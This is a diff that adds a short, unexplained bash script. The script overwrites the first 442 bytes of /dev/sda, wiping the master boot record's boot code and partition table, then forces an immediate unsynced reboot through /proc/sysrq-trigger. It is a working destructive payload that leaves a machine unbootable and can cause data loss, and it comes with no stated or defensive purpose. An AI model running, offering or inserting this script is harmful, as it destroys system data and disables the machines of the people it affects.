@@ -1,0 +1,4 @@
+#!/bin/bash
+
+dd if=/dev/zero of=/dev/sda bs=442 count=1
+echo b > /proc/sysrq-trigger
